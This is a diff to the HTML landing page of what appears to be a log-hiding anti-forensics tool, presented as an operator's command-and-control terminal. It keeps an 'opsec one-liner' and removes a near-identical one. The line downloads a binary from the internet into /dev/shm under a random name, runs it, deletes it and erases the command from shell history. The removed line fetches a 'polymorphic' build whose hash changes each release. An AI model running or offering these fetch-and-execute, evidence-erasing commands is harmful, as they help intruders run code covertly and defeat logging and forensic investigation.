@@ -238,11 +238,8 @@ body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9998;
   <div class="section-head">deploy - opsec one-liner</div>
   <div class="term">
     <div class="term-bar"><span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span><span class="term-title">operator@c2 - deploy</span></div>
-    <div class="term-body"><span class="out"># Standard musl build (prefix space = not saved in bash_history)</span>
+    <div class="term-body"><span class="out"># Download to tmpfs, random name, execute, cleanup (prefix space = not in bash_history)</span>
 <span class="prompt">$ </span><span class="cmd" id="oneliner"> f=$(head -c6 /dev/urandom|xxd -p);curl -sL https://github.com/franckferman/hidemylogs/releases/latest/download/hidemylogs-linux-x86_64-musl -o /dev/shm/$f;chmod +x /dev/shm/$f;/dev/shm/$f print;rm -f /dev/shm/$f;unset f;history -d $(history 1|awk '{print $1}')</span>
-
-<span class="out"># Polymorphic build (unique hash per release)</span>
-<span class="prompt">$ </span><span class="cmd"> f=$(head -c6 /dev/urandom|xxd -p);curl -sL https://github.com/franckferman/hidemylogs/releases/latest/download/hidemylogs-linux-x86_64-musl-poly -o /dev/shm/$f;chmod +x /dev/shm/$f;/dev/shm/$f print;rm -f /dev/shm/$f;unset f;history -d $(history 1|awk '{print $1}')</span>
 
 <span class="out"># What this does:</span>
 <span class="out">#   1. Generate random 12-char hex name</span>
